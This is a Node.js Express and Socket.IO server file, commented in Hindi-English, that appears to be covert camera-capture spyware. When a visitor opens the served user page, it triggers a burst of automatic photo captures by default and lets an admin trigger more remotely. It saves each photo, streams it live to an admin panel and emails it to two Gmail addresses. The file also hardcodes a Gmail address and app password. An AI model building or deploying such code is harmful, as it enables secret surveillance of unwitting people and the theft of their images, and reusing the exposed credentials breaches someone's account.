const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const fs = require('fs');
const nodemailer = require('nodemailer');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir);
}

// ⚠️ Gmail Transport Setup
// APP PASSWORD NOTE: Aapko Google Account Settings -> Security -> App Passwords me jaakar 16-digit App Password generate karke yahan daalna hota hai.
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'Md.danish7499@gmail.com',         // 👈 Sender Gmail ID
        pass: 'qohs qivc jlvo iat'      // 👈 Gmail 16-digit App Password
    }
});

let isAutoCaptureOn = true;

app.get('/admin.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

app.get('/user.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'user.html'));
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'user.html'));
});

app.use(express.static(__dirname));
app.use('/uploads', express.static(uploadDir));

io.on('connection', (socket) => {
    console.log('⚡ Device Connected:', socket.id);

    socket.on('set-auto-capture-state', (state) => {
        isAutoCaptureOn = state;
        console.log(`Auto-capture state: ${isAutoCaptureOn}`);
    });

    socket.on('user-ready', () => {
        io.emit('user-connected');
        if (isAutoCaptureOn) {
            console.log("⚡ Triggering 5 fast auto captures...");
            socket.emit('start-auto-capture');
        }
    });

    socket.on('admin-trigger-capture', () => {
        io.emit('capture-photo');
    });

    socket.on('user-photo-captured', (imageData) => {
        const base64Data = imageData.replace(/^data:image\/png;base64,/, "");
        const fileName = `photo_${Date.now()}.png`;
        const filePath = path.join(uploadDir, fileName);

        fs.writeFile(filePath, base64Data, 'base64', (err) => {
            if (!err) console.log(`✅ Photo Saved: uploads/${fileName}`);
        });

        // Live stream to Admin panel
        io.emit('send-photo-to-admin', imageData);

        // 📧 Both Email Recipients Added Here
        const mailOptions = {
            from: 'Md.danish7499@gmail.com',
            to: 'Practice@gmail.com, Md.danish7499@gmail.com', // 👈 Dono Email IDs par ek sath jayega
            subject: '📸 Live Auto Captured Photo',
            text: 'User photo auto captured successfully.',
            attachments: [{ filename: fileName, content: base64Data, encoding: 'base64' }]
        };

        transporter.sendMail(mailOptions, (error, info) => {
            if (error) {
                console.log('❌ Email Send Error:', error);
            } else {
                console.log('📧 Email Sent Successfully:', info.response);
            }
        });
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 SERVER RUNNING on port ${PORT}!`);
});